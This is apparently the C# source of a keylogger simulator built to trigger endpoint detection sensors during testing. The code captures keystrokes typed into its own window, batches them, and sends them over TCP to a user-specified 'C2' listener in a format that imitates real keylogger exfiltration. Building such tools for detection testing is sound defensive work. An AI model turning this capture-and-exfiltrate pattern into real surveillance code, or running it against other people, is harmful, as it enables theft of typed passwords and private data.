// Copyright (c) 2026 SecurMe — EDR detection testing ONLY.
//
// Keylogger Simulator — captures keystrokes from this window and
// exfiltrates them over TCP to a C2 listener. Designed to trigger
// SecurMe sensor detections:
//   - Process with suspicious name / behavior
//   - Outbound TCP connection to C2
//   - High-frequency small-payload network writes (exfil pattern)
//   - SetWindowsHookEx / KeyPress interception (behavioral)

using System.Net.Sockets;
using System.Text;

namespace SecurMe.Tools.KeyloggerSim;

public partial class MainForm : Form
{
    private TcpClient? _client;
    private NetworkStream? _stream;
    private readonly SemaphoreSlim _sendLock = new(1, 1);
    private int _keyCount;
    private bool _connected;

    // Buffer to batch small sends (more realistic exfil pattern)
    private readonly StringBuilder _sendBuffer = new();
    private System.Windows.Forms.Timer? _flushTimer;

    public MainForm()
    {
        InitializeComponent();

        this.KeyPress += MainForm_KeyPress;
        this.KeyDown += MainForm_KeyDown;

        // Flush buffer every 500ms — batches keystrokes like real
        // keyloggers do instead of one TCP write per key
        _flushTimer = new System.Windows.Forms.Timer { Interval = 500 };
        _flushTimer.Tick += async (_, _) => await FlushBufferAsync();
    }

    // ── Connection management ──

    private async void BtnConnect_Click(object? sender, EventArgs e)
    {
        string ip = txtServerIp.Text.Trim();
        if (!int.TryParse(txtServerPort.Text.Trim(), out int port) || port < 1 || port > 65535)
        {
            MessageBox.Show("Invalid port number.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Warning);
            return;
        }

        btnConnect.Enabled = false;
        lblStatus.Text = "Status: Connecting...";
        lblStatus.ForeColor = Color.Orange;

        try
        {
            _client = new TcpClient();
            await _client.ConnectAsync(ip, port);
            _stream = _client.GetStream();
            _connected = true;

            lblStatus.Text = "Status: Connected";
            lblStatus.ForeColor = Color.Green;
            lblTarget.Text = $"Target: {ip}:{port}";
            btnDisconnect.Enabled = true;
            txtServerIp.Enabled = false;
            txtServerPort.Enabled = false;

            _flushTimer?.Start();
            AppendPreview($"[+] Connected to {ip}:{port}\n");
        }
        catch (Exception ex)
        {
            lblStatus.Text = "Status: Connection failed";
            lblStatus.ForeColor = Color.Red;
            btnConnect.Enabled = true;
            AppendPreview($"[!] Connect error: {ex.Message}\n");
            CleanupConnection();
        }
    }

    private void BtnDisconnect_Click(object? sender, EventArgs e)
    {
        Disconnect("User disconnected");
    }

    private void Disconnect(string reason)
    {
        _flushTimer?.Stop();
        CleanupConnection();
        _connected = false;

        lblStatus.Text = "Status: Disconnected";
        lblStatus.ForeColor = Color.Red;
        lblTarget.Text = "Target: —";
        btnConnect.Enabled = true;
        btnDisconnect.Enabled = false;
        txtServerIp.Enabled = true;
        txtServerPort.Enabled = true;

        AppendPreview($"[-] {reason}\n");
    }

    // ── Keystroke capture ──

    private void MainForm_KeyPress(object? sender, KeyPressEventArgs e)
    {
        if (!_connected) return;

        char c = e.KeyChar;
        string display;

        if (c == '\r' || c == '\n')
            display = "[ENTER]";
        else if (c == '\t')
            display = "[TAB]";
        else if (char.IsControl(c))
            display = $"[0x{(int)c:X2}]";
        else
            display = c.ToString();

        _keyCount++;
        lblKeysLogged.Text = $"Keys sent: {_keyCount}";

        lock (_sendBuffer)
        {
            _sendBuffer.Append(display);
        }

        // Show in preview
        AppendPreview(display);
    }

    private void MainForm_KeyDown(object? sender, KeyEventArgs e)
    {
        if (!_connected) return;

        // KeyPress doesn't fire for nav/modifier keys — send as tokens
        string? token = e.KeyCode switch
        {
            Keys.Left      => "[LEFT]",
            Keys.Right     => "[RIGHT]",
            Keys.Up        => "[UP]",
            Keys.Down      => "[DOWN]",
            Keys.Escape    => "[ESC]",
            Keys.Enter     => "[ENTER]",
            Keys.Back      => "[BKSP]",
            Keys.Tab       => "[TAB]",
            Keys.Delete    => "[DEL]",
            Keys.Home      => "[HOME]",
            Keys.End       => "[END]",
            Keys.PageUp    => "[PGUP]",
            Keys.PageDown  => "[PGDN]",
            Keys.F1        => "[F1]",
            Keys.F2        => "[F2]",
            Keys.F3        => "[F3]",
            Keys.F4        => "[F4]",
            Keys.F5        => "[F5]",
            Keys.F6        => "[F6]",
            Keys.F7        => "[F7]",
            Keys.F8        => "[F8]",
            Keys.F9        => "[F9]",
            Keys.F10       => "[F10]",
            Keys.F11       => "[F11]",
            Keys.F12       => "[F12]",
            Keys.PrintScreen => "[PRTSC]",
            Keys.Insert    => "[INS]",
            _              => null
        };

        if (token != null)
        {
            e.SuppressKeyPress = true;
            _keyCount++;
            lblKeysLogged.Text = $"Keys sent: {_keyCount}";

            lock (_sendBuffer)
            {
                _sendBuffer.Append(token);
            }

            AppendPreview(token);
        }
    }

    // ── Network exfiltration ──

    private async Task FlushBufferAsync()
    {
        string payload;
        lock (_sendBuffer)
        {
            if (_sendBuffer.Length == 0) return;
            payload = _sendBuffer.ToString();
            _sendBuffer.Clear();
        }

        await _sendLock.WaitAsync();
        try
        {
            if (_stream == null || _client == null || !_client.Connected)
            {
                Disconnect("Connection lost");
                return;
            }

            // Prefix with timestamp — matches real keylogger exfil format
            string line = $"{DateTime.UtcNow:yyyy-MM-dd HH:mm:ss} | {payload}\n";
            byte[] data = Encoding.UTF8.GetBytes(line);
            await _stream.WriteAsync(data);
            await _stream.FlushAsync();
        }
        catch (Exception ex)
        {
            AppendPreview($"\n[!] Send error: {ex.Message}\n");
            Disconnect("Send failed");
        }
        finally
        {
            _sendLock.Release();
        }
    }

    // ── Helpers ──

    private void AppendPreview(string text)
    {
        if (InvokeRequired)
        {
            BeginInvoke(() => AppendPreview(text));
            return;
        }

        txtPreview.AppendText(text);

        // Auto-scroll
        txtPreview.SelectionStart = txtPreview.TextLength;
        txtPreview.ScrollToCaret();
    }

    private void CleanupConnection()
    {
        try { _stream?.Close(); } catch { }
        try { _client?.Close(); } catch { }
        _stream = null;
        _client = null;
    }

    protected override void OnFormClosed(FormClosedEventArgs e)
    {
        _flushTimer?.Stop();
        _flushTimer?.Dispose();
        CleanupConnection();
        _sendLock.Dispose();
        base.OnFormClosed(e);
    }

    [STAThread]
    static void Main()
    {
        Application.EnableVisualStyles();
        Application.SetCompatibleTextRenderingDefault(false);
        Application.Run(new MainForm());
    }
}
